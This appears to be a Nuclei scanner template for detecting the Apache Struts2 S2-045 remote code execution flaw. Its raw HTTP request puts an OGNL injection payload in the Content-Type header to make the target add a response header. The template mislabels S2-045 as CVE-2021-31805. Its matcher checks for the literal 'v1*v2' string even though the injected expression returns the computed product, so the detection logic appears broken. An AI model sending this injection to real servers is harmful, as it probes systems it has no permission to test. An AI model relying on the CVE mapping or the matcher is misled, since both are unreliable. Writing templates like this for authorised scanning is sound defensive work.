id: apache-struts2-s2-045-rce
info:
  name: Apache Struts2 S2-045 Remote Code Execution (CVE-2021-31805)
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,CVE-2021-31805

variables:
  v1: "{{rand_int(1, 1000)}}"
  v2: "{{rand_int(1, 1000)}}"

http:
  - raw:
      - |
        POST / HTTP/1.1
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.8,es;q=0.6
        Content-Length: 0
        Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-header-date',{{v1}}*{{v2}})}.multipart/form-data

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "X-header-date"
      - type: dsl
        dsl:
          - contains(header, concat(v1, '*', v2))
